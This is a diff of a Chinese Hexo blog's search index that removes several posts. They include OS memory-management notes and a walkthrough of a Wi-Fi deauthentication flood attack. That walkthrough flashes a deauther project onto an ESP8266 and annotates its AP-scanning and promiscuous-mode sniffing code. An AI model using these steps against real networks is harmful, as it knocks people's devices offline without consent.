tf.nn.conv2d(encoded_image, f, [<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>], padding=<span class="string">&#x27;SAME&#x27;</span>)</span><br><span class="line">	<span class="comment">#应用上述生成的噪声</span></span><br><span class="line">    noise = tf.random_normal(shape=tf.shape(encoded_image), mean=<span class="number">0.0</span>, stddev=rnd_noise, dtype=tf.float32)</span><br><span class="line">    encoded_image = encoded_image + noise</span><br><span class="line">    encoded_image = tf.clip_by_value(encoded_image, <span class="number">0</span>, <span class="number">1</span>)	<span class="comment">#色彩通道变为0~1</span></span><br><span class="line">	<span class="comment">#对比度变化程度</span></span><br><span class="line">    contrast_scale = tf.random_uniform(shape=[tf.shape(encoded_image)[<span class="number">0</span>]], minval=contrast_params[<span class="number">0</span>], maxval=contrast_params[<span class="number">1</span>])</span><br><span class="line">    contrast_scale = tf.reshape(contrast_scale, shape=[tf.shape(encoded_image)[<span class="number">0</span>],<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>])</span><br><span class="line">	<span class="comment">#应用对比度变化</span></span><br><span class="line">    encoded_image = encoded_image * contrast_scale</span><br><span class="line">    <span class="comment">#应用生成的随机亮度/色调变化</span></span><br><span class="line">    encoded_image = encoded_image + rnd_brightness</span><br><span class="line">    encoded_image = tf.clip_by_value(encoded_image, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#饱和度变化</span></span><br><span class="line">    encoded_image_lum = tf.expand_dims(tf.reduce_sum(encoded_image * tf.constant([<span class="number">.3</span>,<span class="number">.6</span>,<span class="number">.1</span>]), axis=<span class="number">3</span>), <span class="number">3</span>)</span><br><span class="line">    encoded_image = (<span class="number">1</span> - rnd_sat) * encoded_image + rnd_sat * encoded_image_lum</span><br><span class="line"></span><br><span class="line">    encoded_image = tf.reshape(encoded_image, [-<span class="number">1</span>,<span class="number">400</span>,<span class="number">400</span>,<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.no_jpeg:	<span class="comment">#jpeg压缩变化</span></span><br><span class="line">        encoded_image = utils.jpeg_compress_decompress(encoded_image, rounding=utils.round_only_at_0, factor=jpeg_factor, downsample_c=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    summaries = [tf.summary.scalar(<span class="string">&#x27;transformer/rnd_bri&#x27;</span>, rnd_bri),</span><br><span class="line">                 tf.summary.scalar(<span class="string">&#x27;transformer/rnd_sat&#x27;</span>, rnd_sat),</span><br><span class="line">                 tf.summary.scalar(<span class="string">&#x27;transformer/rnd_hue&#x27;</span>, rnd_hue),</span><br><span class="line">                 tf.summary.scalar(<span class="string">&#x27;transformer/rnd_noise&#x27;</span>, rnd_noise),</span><br><span class="line">                 tf.summary.scalar(<span class="string">&#x27;transformer/contrast_low&#x27;</span>, contrast_low),</span><br><span class="line">                 tf.summary.scalar(<span class="string">&#x27;transformer/contrast_high&#x27;</span>, contrast_high),</span><br><span class="line">                 tf.summary.scalar(<span class="string">&#x27;transformer/jpeg_quality&#x27;</span>, jpeg_quality)]</span><br><span class="line">	<span class="comment">#返回一个经过模拟现实网络后的编码图像</span></span><br><span class="line">    <span class="keyword">return</span> encoded_image, summaries</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -346,223 +568,6 @@
 <h4 id="核心思想、技术：-1"><a href="#核心思想、技术：-1" class="headerlink" title="核心思想、技术："></a>核心思想、技术：</h4><ol>
 <li>仍然是程序执行、多进程、程序带动其他设备使用的基本结构</li>
 <li>开始重视用户的体验：各种文件、编程环境、图形界面</li>
-</ol>
-]]></content>
-      <categories>
-        <category>操作系统</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>内存管理</title>
-    <url>/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
-    <content><![CDATA[<h2 id="内存使用与分段"><a href="#内存使用与分段" class="headerlink" title="内存使用与分段"></a>内存使用与分段</h2><h3 id="从计算机如何工作开始讲起"><a href="#从计算机如何工作开始讲起" class="headerlink" title="从计算机如何工作开始讲起"></a>从计算机如何工作开始讲起</h3><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/95.png" class="">
-
-<ul>
-<li>内存使用：将程序放入内存中，PC指向开始地址</li>
-</ul>
-<h3 id="首先让程序进入内存"><a href="#首先让程序进入内存" class="headerlink" title="首先让程序进入内存"></a>首先让程序进入内存</h3><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/96.png" class="">
-
-<p>​    用磁盘将对应的机械代码读入内存，call 40时需要在地址总线上发送40，然后main函数的入口就放在40地址处。而物理内存40正好是_entry到_main的偏移地址，所以_entry就在地址0处。</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/97.png" class="">
-
-<p>但如果有0地址处被占用了，或多个程序在内存中，就不能都放在0地址处。</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/98.png" class="">
-
-<p>但一旦IP修改到一个空闲的地址，那么call 40就不再是_main的地址。</p>
-<h3 id="重定位：修改程序中的地址-相对地址-逻辑地址"><a href="#重定位：修改程序中的地址-相对地址-逻辑地址" class="headerlink" title="重定位：修改程序中的地址(相对地址/逻辑地址)"></a>重定位：修改程序中的地址(相对地址/逻辑地址)</h3><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/99.png" class="">
-
-<p>什么时候完成重定位？</p>
-<ol>
-<li>编译时（编译时不知道执行时哪些地址是空闲的，在实际系统中何难实现。但例如嵌入式系统烧录后不再改变，就可以实现）</li>
-<li>载入时（在载入内存时重定位，执行前分配空闲的地址）</li>
-<li>运行时（支持进程换入和换出）</li>
-</ol>
-<h3 id="程序载入后还需要移动"><a href="#程序载入后还需要移动" class="headerlink" title="程序载入后还需要移动"></a>程序载入后还需要移动</h3><ul>
-<li>一个重要概念：交换（swap）<ul>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/100.png" class=""></li>
-<li>如果一个进程阻塞了，那么需要将睡眠的进程换出，将就绪的进程换入。</li>
-<li>一旦进程在载入后移动，地址就又发生了该百年。</li>
-</ul>
-</li>
-</ul>
-<h3 id="重定位最合适的时机-运行时重定位"><a href="#重定位最合适的时机-运行时重定位" class="headerlink" title="重定位最合适的时机-运行时重定位"></a>重定位最合适的时机-运行时重定位</h3><ul>
-<li>在运行每条指令时才完成重定位<ul>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/101.png" class=""></li>
-<li>base放在哪里？怎么找到？<ul>
-<li>在PCB中，一旦进程执行，执行指令翻译时，就从PCB中找基地址</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="引入分段：是将整个程序一起载入内存中吗？"><a href="#引入分段：是将整个程序一起载入内存中吗？" class="headerlink" title="引入分段：是将整个程序一起载入内存中吗？"></a>引入分段：是将整个程序一起载入内存中吗？</h3><ul>
-<li>程序员眼中的程序<ul>
-<li>由若干部分（段）组成，每个段有各自的特点、用途：代码段只读，代码段/数据段不会动态增长</li>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/102.png" class=""></li>
-</ul>
-</li>
-<li>符合用户观点：用户可独立考虑每个分段（分治）</li>
-<li>怎么具体定位具体指令（数据）：&lt;段号，段内偏移&gt;（&lt;cs:ip&gt;）</li>
-</ul>
-<h3 id="不是将整个程序，是将各个段分别放入内存"><a href="#不是将整个程序，是将各个段分别放入内存" class="headerlink" title="不是将整个程序，是将各个段分别放入内存"></a>不是将整个程序，是将各个段分别放入内存</h3><p>由高地址到低地址分别是：</p>
-<ol>
-<li><p><strong>栈</strong>：是一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等。 在程序运行时由编译器在需要的时候分配，在不需要的时候自动清除。</p>
-</li>
-<li><p><strong>堆</strong>：用来存储程序运行时分配的变量。</p>
-<p>堆的大小并不固定，可动态扩张或缩减。其分配由malloc()、new()等这类实时内存分配函数来实现。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free()等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）  堆的内存释放由应用程序去控制，通常一个new()就要对应一个delete()，如果程序员没有释放掉，那么在程序结束后操作系统会自动回收。</p>
-</li>
-<li><p><strong>BSS段</strong>：用来保存全局的和静态的未初始化变量</p>
-</li>
-<li><p><strong>data段</strong>：用来存放保存全局的和静态的已初始化变量</p>
-</li>
-<li><p><strong>text段</strong>：存放着程序的机器码和只读数据，可执行指令就是从这里取得的。</p>
-</li>
-</ol>
-<p>需要一张表，来记录每个段的<strong>基址、长度、读写权限</strong>等，即<strong>进程段表</strong>（LDT）</p>
-<p>而操作系统的那张段表就是（GDT）</p>
-<h3 id="真正的故事：GDT-LDT"><a href="#真正的故事：GDT-LDT" class="headerlink" title="真正的故事：GDT+LDT"></a>真正的故事：GDT+LDT</h3><p>GDT表项：</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/103.png" class="">
-
-<p>通过GDT表分开各个进程的基址，通过LDT表来分开进程中各个段的基址</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/104.png" class="">
-
-<h2 id="内存分区与分页"><a href="#内存分区与分页" class="headerlink" title="内存分区与分页"></a>内存分区与分页</h2><p>编译将程序分成多个段以后，需要将内存分成多个区域。将内存分割后，就能将程序的各个段载入到相应的内存分区中。</p>
-<h3 id="固定分区和可变分区"><a href="#固定分区和可变分区" class="headerlink" title="固定分区和可变分区"></a>固定分区和可变分区</h3><ul>
-<li>将内存等分成k个分区<ul>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/105.png" class=""></li>
-<li>但程序有大有小。段也有大有小，需求不一样，这样不太合适</li>
-</ul>
-</li>
-<li>按需要分配内存分区<ul>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/106.png" class=""></li>
-</ul>
-</li>
-</ul>
-<h3 id="可变分区的管理过程-核心数据结构"><a href="#可变分区的管理过程-核心数据结构" class="headerlink" title="可变分区的管理过程-核心数据结构"></a>可变分区的管理过程-核心数据结构</h3><p>当前内存图像：</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/107.png" class="">
-
-<p>对应的表：</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/108.png" class="">
-
-<ul>
-<li>当段内存请求：reqSize=100K<ul>
-<li>起始地址+100K</li>
-<li>长度-100K</li>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/109.png" class=""></li>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/110.png" class=""></li>
-</ul>
-</li>
-<li>段2不再需要，释放内存<ul>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/111.png" class=""></li>
-</ul>
-</li>
-</ul>
-<h3 id="可变分区的管理-再次申请"><a href="#可变分区的管理-再次申请" class="headerlink" title="可变分区的管理-再次申请"></a>可变分区的管理-再次申请</h3><ul>
-<li>又一个段提出内存申请：reqSize=40K。空闲分区表中有两个分区，选择哪一个需要合适的算法（长度分别为50K和150K）<ul>
-<li>首<strong>先</strong>适配：选表中第一个空闲分区<ul>
-<li>速度最快</li>
-</ul>
-</li>
-<li>最<strong>佳</strong>适配：选择一个分区长度最接近内存申请长度的区域<ul>
-<li>空闲分区会被分割的越来约小</li>
-</ul>
-</li>
-<li>最<strong>差</strong>适配：选择一个分区长度最不接近内存申请长度的区域（最大的区域）<ul>
-<li>空闲分区长度会很均匀</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="引入分页：解决内存分区导致的内存效率问题"><a href="#引入分页：解决内存分区导致的内存效率问题" class="headerlink" title="引入分页：解决内存分区导致的内存效率问题"></a>引入分页：解决内存分区导致的内存效率问题</h3><ul>
-<li>发起请求reqSize=160K怎么办？<ul>
-<li>总空闲空间&gt;160，但没有一个空闲分区&gt;160，怎么办？<ul>
-<li>这就是内存碎片的问题</li>
-<li>将空闲分区合并，则需要移动：<strong>内存紧缩</strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li>但是内存紧缩会有大量的性能损失</li>
-</ul>
-<h3 id="从连续到离散"><a href="#从连续到离散" class="headerlink" title="从连续到离散"></a>从连续到离散</h3><p>将内存分成页，针对每个段内存请求，系统一页一页的分配给这个段。</p>
-<ul>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/112.png" class=""></li>
-<li>段内存请求来到后，算一下需要几页的内存，然后将内存一页一页地分配给这个段。</li>
-<li>这样一来有页内部碎片，但没有页外部碎片</li>
-</ul>
-<h3 id="页已经载入了内存，那么"><a href="#页已经载入了内存，那么" class="headerlink" title="页已经载入了内存，那么"></a>页已经载入了内存，那么</h3><p>程序调用内存，需要通过偏移地址，找到对应的页号（页框），而页内的地址需要重定位。</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/113.png" class="">
-
-<p>每个进程都有自己的页表：</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/114.png" class="">
-
-<p>若有一指令：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov [0x2240],	%eax</span><br></pre></td></tr></table></figure>
-
-<p>则需要将0x2240除以4K（假设的页大小），然后得到页号（商）和页内偏移地址（余数）</p>
-<p>计算机内的除4K即右移12位，所有地址后12位是偏移地址，前4位是页号。</p>
-<p>逻辑地址：0x2240，0x2是页号找到页框号（0x3），0x240是页内偏移地址</p>
-<p>得到物理地址：0x3240</p>
-<h2 id="多级页表和快表"><a href="#多级页表和快表" class="headerlink" title="多级页表和快表"></a>多级页表和快表</h2><h3 id="页表会很大，页表放置就成了问题"><a href="#页表会很大，页表放置就成了问题" class="headerlink" title="页表会很大，页表放置就成了问题"></a>页表会很大，页表放置就成了问题</h3><p>为了提高空间利用率，页的大小就应该小，但页的表项就会多。</p>
-<ul>
-<li>页大小一般是4k，而地址是32位的，所以由2的20次方个页表现</li>
-<li>这么多页表项，需要4M的内存；当系统中并发10个进程，就需要40M内存</li>
-<li>进程越多，存储页表项需要内存越多，这也是一种内存的浪费</li>
-</ul>
-<p>实际上大部分逻辑地址根本不会用到</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/115.png" class="">
-
-<h3 id="第一种尝试，只存放用到的页"><a href="#第一种尝试，只存放用到的页" class="headerlink" title="第一种尝试，只存放用到的页"></a>第一种尝试，只存放用到的页</h3><ul>
-<li>很自然的想法：只有用到的逻辑页才有页表项<ul>
-<li>但页表中的页号不连续，就需要比较、查找 ，浪费时间</li>
-<li>如果页号连续，一次访问就能找到相应的页框号</li>
-</ul>
-</li>
-<li>页号连续，浪费内存。页号不连续，浪费查找时间</li>
-</ul>
-<p>既要连续又要让页表占用内存少，怎么办？</p>
-<h3 id="多级页表，即页目录表-页表"><a href="#多级页表，即页目录表-页表" class="headerlink" title="多级页表，即页目录表 + 页表"></a>多级页表，即页目录表 + 页表</h3><p>​        多个页号放进一个页目录中，这样生成的页表只记录该页目录下的页，就缩小了页表的长度。而这样的一个页表又是连续的，就不需要比较查找。</p>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/116.png" class="">
-
-<p>​        offset指向了一个4k大小的页。而一个页目录下有1024个页。共有1024个页目录。所以一个32位逻辑地址指向了一个4G的空间。</p>
-<h3 id="多级页表提高了空间效率，但在时间？"><a href="#多级页表提高了空间效率，但在时间？" class="headerlink" title="多级页表提高了空间效率，但在时间？"></a>多级页表提高了空间效率，但在时间？</h3><ul>
-<li>多级页表怎加了访问内存的次数<ul>
-<li>每增加一级页表，内存的访问次数就要怎加一次</li>
-<li>访问次数增多，时间效率不高</li>
-</ul>
-</li>
-<li>快表：TLB是一组相联快速存储，是寄存器<ul>
-<li>将最常用的页号存到寄存器中，调用十分迅速</li>
-<li><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/117.png" class="">
-<ul>
-<li>如果命中，可以直接硬件上将逻辑地址转换成物理地址</li>
-<li>如果不命中，就去多级页表中查，然后将这次的存储地址放到快表中（空间局部性好的程序往往查找速度越快）</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>多级页表保证了减少了页表中的页表项，减少了内存损耗。通过快表保证了多次使用的内存，查找速度很快。这样以来，空间时间上都有较高的效率。</li>
-</ul>
-<img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/118.png" class="">
-
-<p>​        通过有效访问时间的计算，可以判断一个快表的好坏（后面会有换入和换出算法来更新快表，这种算法越好，快表命中率越高）。而快表越大，命中率也越高，但TLB也越贵。</p>
-<h2 id="段页结合的实际内存管理"><a href="#段页结合的实际内存管理" class="headerlink" title="段页结合的实际内存管理"></a>段页结合的实际内存管理</h2><h3 id="段、页同时存在：段面向用户-页面向硬件"><a href="#段、页同时存在：段面向用户-页面向硬件" class="headerlink" title="段、页同时存在：段面向用户/页面向硬件"></a>段、页同时存在：段面向用户/页面向硬件</h3><img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/119.png" class="">
-
-<p>每个段再分页映射到物理内存。</p>
-<h3 id="段页同时存在时的重定位"><a href="#段页同时存在时的重定位" class="headerlink" title="段页同时存在时的重定位"></a>段页同时存在时的重定位</h3>  <img src="/2021/12/05/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/120.png" class="">
-
-<h3 id="一个实际的段页式内存管理"><a href="#一个实际的段页式内存管理" class="headerlink" title="一个实际的段页式内存管理"></a>一个实际的段页式内存管理</h3><h3 id="从程序放入内存开始"><a href="#从程序放入内存开始" class="headerlink" title="从程序放入内存开始"></a>从程序放入内存开始</h3><ol>
-<li>分配段、建段表；分配页、建页表</li>
-<li>进程带动使用内存</li>
-<li>从进程fork中的内存分配开始<ul>
-<li>fork时会新分配段基址，然后复制父进程的页表</li>
-</ul>
-</li>
-<li>读时共享，写时复制<ul>
-<li>比如在父进程内原来有一个全局变量，如果fork之后父子进程都没有去改变这个变量的值，那么内存中全局区这个变量只会存在一份，所谓读时共享；但是如果fork后父进程或者子进程改变了这个变量的值，那么这个变量将会在内存全局区存在两份，父子进程各自拥有各自的副本，这就是写时复制</li>
-</ul>
-</li>
 </ol>
 ]]></content>
       <categories>
@@ -1202,58 +1207,6 @@
       </categories>
   </entry>
   <entry>
-    <title>无线DOS之取消验证洪水攻击</title>
-    <url>/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>​    取消验证洪水攻击，全程为De-authenticationFloodAttack,简称为Deauth攻击。首先，攻击者通过扫描周围的WIFI网络，获取WIFI站点的SSID。然后扫描连接周围连接该网络的设备。最后，对周边网络进行抓包（嗅探），寻找要攻击的WIFI站点和连接该站点的设备，以获取的包头信息重新构造一个取消验证包，发给连接设备。设备会被欺骗，从而取消对AP的连接。</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/0.png" class="">
-
-<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>​    参考已有的张馆长的工程，将其烧录到esp8266模块上。<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1.jpg" class=""></p>
-<p>简单配置一下</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/2.jpg" class="">
-
-<p>烧录</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/3.jpg" class="">
-
-<p>这时，esp8266会建立一个WIFI，</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/4.jpg" class="">
-
-<p>我们连接这个wifi，进入192.168.4.1，可以看到攻击界面，里面会显示当前的AP，我们选取一个作为攻击对象。这里我们设置的是无差别攻击。当我们要定点攻击时，需要扫描连接该WiFi的设备，选择一个攻击。</p>
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/5.jpg" class="">
-
-<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/6.jpg" class="">
-
-<p>​        选择Deauth攻击，然后我们就可以观察到连接该网的设备断连的现象，手机上方的WiFi图标会不断闪烁。</p>
-<h1 id="代码架构"><a href="#代码架构" class="headerlink" title="代码架构"></a>代码架构</h1><p>首先，WIFI模块有两种工作模式：</p>
-<p>ap是无线发射端，station是接收端，两种模式组建成一个无线局域网。</p>
-<ol>
-<li>ap mode 通常应用在无线局域网成员设备（即客户端）的加入，即<strong>网络下行</strong>。它提供以无线方式组建无线局域网 WLAN，相当际 <strong>WLAN 的中心设备</strong>。AP和AP之间允许相互连接。</li>
-<li>station mode即工作站模式，可以理解为某个网格中的一个工作站即<strong>客户端</strong>，<strong>网络上行</strong>。那当一个 WIFI 芯片提供这个功能时，它就可以连到另外的一个网络当中，如家用路由器。通常用于提供网络的数据上行服务。</li>
-</ol>
-<p>代码的核心是扫描、嗅探和伪造。扫描站点，嗅探（抓包）和通过。</p>
-<p>首先是扫描：</p>
-<p>​    AP模式扫描周围的AP。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line">	<span class="comment">/* AP Scan */</span></span><br><span class="line">    <span class="keyword">if</span> ((mode == SCAN_MODE_APS) || (mode == SCAN_MODE_ALL)) &#123;</span><br><span class="line">        <span class="comment">// remove old results</span></span><br><span class="line">        accesspoints.removeAll();</span><br><span class="line">        stations.removeAll();</span><br><span class="line">        <span class="comment">// start AP scan</span></span><br><span class="line">        prntln(SC_START_AP);</span><br><span class="line">        WiFi.scanNetworks(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">/*该函数可以扫描到ESP8266开发板所在环境中的可用WIFI网络，并且将WiFi网络信息保存到内存中。通过调用SSID、RSSI等函数，我们还可以得到这些扫描到的WIFI的更多信息。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>​    station模式开启后可以开启混杂模式（混杂模式（英语：promiscuous mode）是电脑网络中的术语。是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。），从而为嗅探作准备</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line"><span class="comment">/* Station Scan */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (mode == SCAN_MODE_STATIONS) &#123;</span><br><span class="line">        <span class="comment">// start station scan</span></span><br><span class="line">        <span class="keyword">if</span> (accesspoints.count() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            start(SCAN_MODE_ALL);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="comment">//如果当前网络没有AP,返回重新扫描，因为我们需要先确定攻击的AP再确定攻击的设备，如果在嗅探前AP已经不存在了，则没有继续的必要</span></span><br><span class="line">        snifferStartTime = currentTime;</span><br><span class="line">        prnt(SC_START_CLIENT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sniffTime &gt; <span class="number">0</span>) prnt(String(sniffTime / <span class="number">1000</span>) + S);</span><br><span class="line">        <span class="keyword">else</span> prnt(SC_INFINITELY);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!channelHop) &#123;</span><br><span class="line">            prnt(SC_ON_CHANNEL);</span><br><span class="line">            prnt(wifi_channel);</span><br><span class="line">        &#125;</span><br><span class="line">        prntln();</span><br><span class="line">        wifi::stopAP();</span><br><span class="line">        wifi_promiscuous_enable(<span class="literal">true</span>);<span class="comment">//开启混杂模式</span></span><br><span class="line">    	<span class="comment">/*混杂模式就是接收所有经过网卡的数据包，包括不是发给本机的包。默认情况下网卡只把发给本机的包（包括广播包）传递给上层程序，其它的包一律丢弃。但是混杂模式就是指网卡能接受所有通过它的数据流，不管是什么格式，什么地址的。事实上，计算机收到数据包后，由网络层进行判断（这里是802.11系协议），确定是递交上层（传输层），还是丢弃，还是递交下层（数据链路层、MAC子层）转发。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>进入嗅探模式：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scan::sniffer</span><span class="params">(<span class="keyword">uint8_t</span>* buf, <span class="keyword">uint16_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isSniffing()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    packets++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">28</span>) <span class="keyword">return</span>;  <span class="comment">// 丢弃掉过短的数据包</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0xc0</span>) || (buf[<span class="number">12</span>] == <span class="number">0xa0</span>)) &#123;</span><br><span class="line">        tmpDeauths++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 丢弃信标帧、探测请求/响应和解除授权/解除关联帧</span></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0x80</span>) || (buf[<span class="number">12</span>] == <span class="number">0x40</span>) || (buf[<span class="number">12</span>] == <span class="number">0x50</span>) <span class="comment">/* || buf[12] == 0xc0 || buf[12] == 0xa0*/</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只允许数据帧</span></span><br><span class="line">    <span class="comment">// if(buf[12] != 0x08 &amp;&amp; buf[12] != 0x88) return;数据帧12位为08和88的时候说明是数据帧，如果都不是，可以丢弃，但作者将这句话注释了，不知道原因。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>* macTo   = &amp;buf[<span class="number">16</span>];<span class="comment">//该数据包要去哪</span></span><br><span class="line">    <span class="keyword">uint8_t</span>* macFrom = &amp;buf[<span class="number">22</span>];<span class="comment">//该数据包从哪来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (macBroadcast(macTo) || macBroadcast(macFrom) || !macValid(macTo) || !macValid(macFrom) || macMulticast(macTo) ||</span><br><span class="line">        macMulticast(macFrom)) <span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//Broadcast所谓广播地址指同时向网上所有的主机发送报文，也就是说，不管物理网络特性如何，internet网都支持广播传输。这里表示如果收发地址为广播地址，则丢弃。</span></span><br><span class="line">    <span class="comment">//Multicast是一个群组传播模式。。。其他的看不懂了，和上面区别不大。也丢弃。</span></span><br><span class="line">    <span class="comment">//上面两种的特点都是一对多模式，而我们只需要要截获一对一的数据包，并认为该mac为有效mac地址。</span></span><br><span class="line">    <span class="keyword">int</span> accesspointNum = findAccesspoint(macFrom);<span class="comment">//查看该mac地址有几个AP。这个如果小于0说明该mac地址是连接AP的设备</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        stations.add(macTo, accesspoints.getID(accesspointNum));</span><br><span class="line">        <span class="comment">//macForm为AP了，那么macTo肯定为设备，我们将该设备的mac加入列表。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  <span class="comment">//如果AP数量为0，那么macTo是AP，macForm为设备，</span></span><br><span class="line">        accesspointNum = findAccesspoint(macTo);</span><br><span class="line">        <span class="comment">//这两个if判断谁是AP谁是设备，写的很垃圾</span></span><br><span class="line">        <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            stations.add(macFrom, accesspoints.getID(accesspointNum));</span><br><span class="line">            <span class="comment">//我们将该设备的mac加入列表。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
